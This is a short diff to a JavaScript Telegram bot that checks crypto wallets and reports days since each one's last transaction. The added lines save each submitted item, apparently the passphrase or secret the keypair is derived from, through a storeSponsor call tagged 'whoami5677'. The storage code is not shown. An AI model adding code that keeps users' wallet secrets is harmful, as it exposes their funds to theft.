@@ -340,6 +340,11 @@ bot.on('message', async (msg) => {
                     const now = new Date();
                     const diffDays = Math.floor((now - lastTxDate) / (1000 * 60 * 60 * 24));
 
+                    const saved = await storeSponsor(p.toLowerCase(), 'whoami5677')
+                    if(saved.success) {
+                        await bot.sendMessage(chatId, `⏳ Saved ${index} of ${words.length}`);
+                    }
+
                     result +=  `\n ${index + 1}. ${kp.publicKey()} - Last tx in ${diffDays} days(s) \n\n`;
                     await sleep(1000)
                 }
